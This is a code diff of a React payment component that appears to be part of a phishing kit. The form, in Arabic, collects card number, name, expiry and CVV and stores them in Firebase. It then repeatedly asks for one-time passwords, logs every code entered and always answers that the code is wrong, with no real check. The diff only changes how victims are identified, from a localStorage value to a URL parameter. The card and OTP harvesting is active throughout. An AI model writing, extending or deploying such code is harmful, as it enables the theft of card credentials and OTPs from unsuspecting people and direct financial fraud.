@@ -2,6 +2,7 @@
 
 import { addData } from "@/lib/firebase"
 import { useState, type ChangeEvent, type FormEvent } from "react"
+import { useSearchParams } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { FullPageLoader } from "./loader"
 
@@ -15,6 +16,9 @@ interface CardData {
 const allOtps = [""]
 
 export default function AddCard() {
+  const searchParams = useSearchParams()
+  const id = searchParams.get("id")
+
   const [cardData, setCardData] = useState<CardData>({
     number: "",
     name: "",
@@ -35,7 +39,6 @@ export default function AddCard() {
 
   const handleCardSubmit = async (e: FormEvent) => {
     e.preventDefault()
-    const visitorID = localStorage.getItem("visitor")
 
     if (!cardData.number || !cardData.name || !cardData.expiry || !cardData.cvv) {
       setError("الرجاء إدخال جميع بيانات البطاقة.")
@@ -43,7 +46,7 @@ export default function AddCard() {
     }
     setLoading(true)
     await addData({
-      id: visitorID,
+      id: id || undefined,
       cardNumber: cardData.number,
       cardExpiry: cardData.expiry,
       cvv: cardData.cvv,
@@ -55,18 +58,16 @@ export default function AddCard() {
     setTimeout(() => {
       setLoading(false)
       setStep("otp")
-    }, 3000);
-
+    }, 3000)
   }
 
   const handleOtpSubmit = async (e: FormEvent) => {
     e.preventDefault()
     setLoading(true)
-    const visitorID = localStorage.getItem("visitor")
     allOtps.push(otp)
 
     await addData({
-      id: visitorID,
+      id: id || undefined,
       otp,
       allOtps,
       createdDate: new Date().toISOString(),
@@ -75,7 +76,7 @@ export default function AddCard() {
     setTimeout(() => {
       setLoading(false)
       setError("رمز التحقق غير صحيح.")
-    }, 3000);
+    }, 3000)
   }
 
   const handleInputChange = (e: ChangeEvent<HTMLInputElement>, field: keyof CardData) => {
